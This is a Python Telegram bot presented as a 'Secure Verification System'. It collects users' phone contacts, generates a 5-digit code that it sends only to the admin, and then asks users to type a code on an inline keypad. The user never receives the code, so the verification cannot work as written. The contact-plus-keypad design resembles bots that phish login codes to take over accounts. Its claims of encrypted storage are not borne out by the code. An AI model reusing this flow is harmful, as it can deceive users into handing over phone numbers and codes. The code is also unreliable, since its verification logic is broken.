import logging
import random
import os
import hashlib
import hmac
import time
from functools import wraps
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import sqlite3
from datetime import datetime, timedelta

# Security Configuration
SECRET_KEY = os.getenv('SECRET_KEY', os.urandom(32).hex())
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))
MAX_ATTEMPTS = 3
SESSION_TIMEOUT = 600  # 10 minutes

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Rate limiting storage
rate_limit_storage = {}

def rate_limit(max_calls=5, time_frame=60):
    """Rate limiting decorator"""
    def decorator(func):
        @wraps(func)
        async def wrapper(update, context):
            user_id = update.effective_user.id
            current_time = time.time()
            
            if user_id not in rate_limit_storage:
                rate_limit_storage[user_id] = []
            
            rate_limit_storage[user_id] = [
                req_time for req_time in rate_limit_storage[user_id]
                if current_time - req_time < time_frame
            ]
            
            if len(rate_limit_storage[user_id]) >= max_calls:
                await update.message.reply_text(
                    "⏳ Too many requests. Please try again later.",
                    parse_mode='Markdown'
                )
                logger.warning(f"Rate limit exceeded for user {user_id}")
                return
            
            rate_limit_storage[user_id].append(current_time)
            return await func(update, context)
        return wrapper
    return decorator

def admin_only(func):
    """Admin-only decorator"""
    @wraps(func)
    async def wrapper(update, context):
        user_id = update.effective_user.id
        if user_id != ADMIN_ID:
            logger.warning(f"Unauthorized admin access attempt by user {user_id}")
            return
        return await func(update, context)
    return wrapper

def generate_secure_token(user_id: int, timestamp: str) -> str:
    """Generate HMAC-based secure token"""
    message = f"{user_id}:{timestamp}".encode()
    return hmac.new(SECRET_KEY.encode(), message, hashlib.sha256).hexdigest()

def verify_token(user_id: int, timestamp: str, token: str) -> bool:
    """Verify HMAC token"""
    expected_token = generate_secure_token(user_id, timestamp)
    return hmac.compare_digest(expected_token, token)

class SecureVerificationBot:
    def __init__(self):
        self.init_database()
        self.verification_sessions = {}
        self.failed_attempts = {}
        
    def init_database(self):
        """Initialize encrypted SQLite database with proper schema"""
        self.conn = sqlite3.connect('verification.db', check_same_thread=False)
        cursor = self.conn.cursor()
        
        # Users table with hashed data
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username_hash TEXT,
                first_name_hash TEXT,
                phone_hash TEXT,
                verification_token TEXT,
                verified INTEGER DEFAULT 0,
                created_at TEXT,
                verified_at TEXT,
                ip_address TEXT,
                last_activity TEXT
            )
        ''')
        
        # Audit log table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS audit_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                action TEXT,
                details TEXT,
                timestamp TEXT,
                ip_address TEXT
            )
        ''')
        
        # Session table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at TEXT,
                expires_at TEXT,
                is_active INTEGER DEFAULT 1
            )
        ''')
        
        self.conn.commit()
        logger.info("Database initialized successfully")

    def hash_data(self, data: str) -> str:
        """Hash sensitive data using SHA-256"""
        return hashlib.sha256(f"{data}{SECRET_KEY}".encode()).hexdigest()

    def log_action(self, user_id: int, action: str, details: str = ""):
        """Log user actions for audit trail"""
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO audit_log (user_id, action, details, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (user_id, action, details, datetime.now().isoformat()))
        self.conn.commit()

    def is_user_blocked(self, user_id: int) -> bool:
        """Check if user is temporarily blocked due to failed attempts"""
        if user_id in self.failed_attempts:
            attempts, last_attempt = self.failed_attempts[user_id]
            if attempts >= MAX_ATTEMPTS:
                if datetime.now() - last_attempt < timedelta(minutes=30):
                    return True
                else:
                    del self.failed_attempts[user_id]
        return False

    def record_failed_attempt(self, user_id: int):
        """Record failed verification attempt"""
        if user_id not in self.failed_attempts:
            self.failed_attempts[user_id] = [0, datetime.now()]
        
        attempts, _ = self.failed_attempts[user_id]
        self.failed_attempts[user_id] = [attempts + 1, datetime.now()]

    def clean_expired_sessions(self):
        """Clean expired sessions from memory"""
        current_time = datetime.now()
        expired_users = []
        
        for user_id, session in self.verification_sessions.items():
            if current_time - session.get('created_at', current_time) > timedelta(seconds=SESSION_TIMEOUT):
                expired_users.append(user_id)
        
        for user_id in expired_users:
            del self.verification_sessions[user_id]
            logger.info(f"Cleaned expired session for user {user_id}")

    @rate_limit(max_calls=3, time_frame=60)
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command with security checks"""
        user = update.message.from_user
        
        if self.is_user_blocked(user.id):
            await update.message.reply_text(
                "🚫 Your account is temporarily blocked due to multiple failed attempts.\n"
                "Please try again in 30 minutes.",
                parse_mode='Markdown'
            )
            return
        
        cursor = self.conn.cursor()
        cursor.execute('SELECT verified FROM users WHERE user_id = ?', (user.id,))
        result = cursor.fetchone()
        
        if result and result[0]:
            await update.message.reply_text(
                "✅ **Already Verified!**\n\n"
                "You're already verified in our system.",
                parse_mode='Markdown'
            )
            self.log_action(user.id, "start_already_verified")
            return
        
        self.log_action(user.id, "start_new_verification")
        
        welcome_text = f"""
🔐 **Secure Verification System**

Hello {user.first_name}!

To access our services, please complete the verification process.

**Step 1:** Share your contact information securely.

👇 Click the button below to proceed.

⚡ Your data is encrypted and protected.
        """
        
        keyboard = ReplyKeyboardMarkup([
            [KeyboardButton("📱 Share Contact", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            welcome_text,
            parse_mode='Markdown',
            reply_markup=keyboard
        )

    @rate_limit(max_calls=2, time_frame=120)
    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle contact sharing with security validation"""
        try:
            user = update.message.from_user
            contact = update.message.contact
            
            if self.is_user_blocked(user.id):
                await update.message.reply_text(
                    "🚫 Your account is temporarily blocked.",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
            
            if contact.user_id != user.id:
                await update.message.reply_text(
                    "❌ Please share your own contact only.",
                    reply_markup=ReplyKeyboardRemove()
                )
                self.log_action(user.id, "invalid_contact_shared")
                return
            
            # Generate secure verification code
            verification_code = ''.join([str(random.randint(0, 9)) for _ in range(5)])
            timestamp = datetime.now().isoformat()
            token = generate_secure_token(user.id, timestamp)
            
            # Store hashed data
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO users 
                (user_id, username_hash, first_name_hash, phone_hash, verification_token, created_at, last_activity)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                user.id,
                self.hash_data(user.username or ""),
                self.hash_data(user.first_name),
                self.hash_data(contact.phone_number),
                token,
                timestamp,
                timestamp
            ))
            self.conn.commit()
            
            self.log_action(user.id, "contact_shared", f"Phone: {contact.phone_number[:3]}***")
            
            await update.message.reply_text("✅", reply_markup=ReplyKeyboardRemove())
            
            status_msg = await update.message.reply_text(
                "🔐 **Generating secure code...**",
                parse_mode='Markdown'
            )
            
            await context.application.bot.send_chat_action(user.id, "typing")
            await status_msg.edit_text("✅ **Code generated!**", parse_mode='Markdown')
            
            await self.send_code_interface(context, user.id, verification_code)
            
            # Notify admin with minimal info
            if ADMIN_ID:
                await context.bot.send_message(
                    ADMIN_ID,
                    f"""
📱 **New Verification Request**

👤 User ID: `{user.id}`
📞 Phone: `{contact.phone_number[:3]}***{contact.phone_number[-2:]}`
🔢 Code: `{verification_code}`
🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                    """,
                    parse_mode='Markdown'
                )
            
            self.verification_sessions[user.id] = {
                'code': '',
                'correct_code': verification_code,
                'attempts': 0,
                'created_at': datetime.now()
            }
            
        except Exception as e:
            logger.error(f"Error handling contact: {e}", exc_info=True)
            await update.message.reply_text(
                "❌ An error occurred. Please try /start again."
            )

    async def send_code_interface(self, context, user_id: int, code: str):
        """Send secure code input interface"""
        try:
            keyboard = [
                [
                    InlineKeyboardButton('1', callback_data=f'n_1_{user_id}'),
                    InlineKeyboardButton('2', callback_data=f'n_2_{user_id}'),
                    InlineKeyboardButton('3', callback_data=f'n_3_{user_id}')
                ],
                [
                    InlineKeyboardButton('4', callback_data=f'n_4_{user_id}'),
                    InlineKeyboardButton('5', callback_data=f'n_5_{user_id}'),
                    InlineKeyboardButton('6', callback_data=f'n_6_{user_id}')
                ],
                [
                    InlineKeyboardButton('7', callback_data=f'n_7_{user_id}'),
                    InlineKeyboardButton('8', callback_data=f'n_8_{user_id}'),
                    InlineKeyboardButton('9', callback_data=f'n_9_{user_id}')
                ],
                [
                    InlineKeyboardButton('⬅️ Back', callback_data=f'back_{user_id}'),
                    InlineKeyboardButton('0', callback_data=f'n_0_{user_id}'),
                    InlineKeyboardButton('✓ Submit', callback_data=f'submit_{user_id}')
                ]
            ]
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            message_text = """
🔐 **Enter Verification Code**

Code: ` - - - - - `

Use the keypad below to enter your 5-digit code.
            """
            
            await context.bot.send_message(
                user_id,
                message_text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            
        except Exception as e:
            logger.error(f"Error sending interface: {e}", exc_info=True)

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle callback queries with security validation"""
        try:
            query = update.callback_query
            user_id = query.from_user.id
            
            await query.answer()
            
            self.clean_expired_sessions()
            
            if user_id not in self.verification_sessions:
                await query.edit_message_text(
                    "⏱️ Session expired. Please /start again."
                )
                return
            
            session = self.verification_sessions[user_id]
            data = query.data
            
            if data.startswith('n_'):
                digit = data.split('_')[1]
                
                if len(session['code']) < 5:
                    session['code'] += digit
                    
                display_code = ' '.join(session['code'].ljust(5, '-'))
                
                await query.edit_message_text(
                    f"""
🔐 **Enter Verification Code**

Code: ` {display_code} `

Use the keypad below to enter your 5-digit code.
                    """,
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
            
            elif data.startswith('back_'):
                if len(session['code']) > 0:
                    session['code'] = session['code'][:-1]
                    display_code = ' '.join(session['code'].ljust(5, '-'))
                    
                    await query.edit_message_text(
                        f"""
🔐 **Enter Verification Code**

Code: ` {display_code} `

Use the keypad below to enter your 5-digit code.
                        """,
                        parse_mode='Markdown',
                        reply_markup=query.message.reply_markup
                    )
            
            elif data.startswith('submit_'):
                await self.verify_code(query, user_id, session)
                    
        except Exception as e:
            logger.error(f"Error in callback: {e}", exc_info=True)
            await query.edit_message_text(
                "❌ An error occurred. Please /start again."
            )

    async def verify_code(self, query, user_id: int, session: dict):
        """Verify the entered code"""
        if len(session['code']) != 5:
            await query.answer("⚠️ Please enter all 5 digits", show_alert=True)
            return
        
        session['attempts'] += 1
        
        if session['code'] == session['correct_code']:
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE users 
                SET verified = 1, verified_at = ?
                WHERE user_id = ?
            ''', (datetime.now().isoformat(), user_id))
            self.conn.commit()
            
            self.log_action(user_id, "verification_success")
            
            await query.edit_message_text(
                "✅ **Verification Successful!**\n\n"
                "Your account has been verified.\n"
                "Welcome aboard! 🎉",
                parse_mode='Markdown'
            )
            
            del self.verification_sessions[user_id]
            if user_id in self.failed_attempts:
                del self.failed_attempts[user_id]
        else:
            self.record_failed_attempt(user_id)
            remaining = MAX_ATTEMPTS - session['attempts']
            
            if remaining > 0:
                session['code'] = ''
                await query.edit_message_text(
                    f"""
❌ **Incorrect Code**

Attempts remaining: {remaining}

Code: ` - - - - - `

Please try again.
                    """,
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
                self.log_action(user_id, "verification_failed", f"Attempt {session['attempts']}")
            else:
                await query.edit_message_text(
                    "🚫 **Maximum attempts exceeded**\n\n"
                    "Your verification has been blocked for 30 minutes.\n"
                    "Please try again later.",
                    parse_mode='Markdown'
                )
                self.log_action(user_id, "verification_blocked")
                del self.verification_sessions[user_id]

    @admin_only
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin statistics with enhanced security"""
        cursor = self.conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM users WHERE verified = 1')
        verified = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM users')
        total = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM audit_log WHERE action = "verification_failed"')
        failed = cursor.fetchone()[0]
        
        cursor.execute('''
            SELECT COUNT(DISTINCT user_id) FROM audit_log 
            WHERE timestamp > datetime('now', '-24 hours')
        ''')
        active_24h = cursor.fetchone()[0]
        
        self.log_action(update.message.from_user.id, "admin_stats_viewed")
        
        await update.message.reply_text(
            f"""
📊 **System Statistics**

✅ Verified Users: {verified}
📝 Total Users: {total}
⏳ Pending: {total - verified}
❌ Failed Attempts: {failed}
👥 Active (24h): {active_24h}
🔒 Blocked Users: {len(self.failed_attempts)}

📅 Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """,
            parse_mode='Markdown'
        )

def main():
    """Run the secure bot"""
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set in environment variables!")
        return
    
    if not SECRET_KEY:
        logger.error("❌ SECRET_KEY not set in environment variables!")
        return
    
    bot = SecureVerificationBot()
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Register handlers
    app.add_handler(CommandHandler("start", bot.start_command))
    app.add_handler(CommandHandler("stats", bot.stats_command))
    app.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
    app.add_handler(CallbackQueryHandler(bot.handle_callback))
    
    logger.info("🚀 Secure bot started successfully!")
    logger.info(f"🔐 Security features enabled: Rate limiting, Token validation, Session management")
    
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
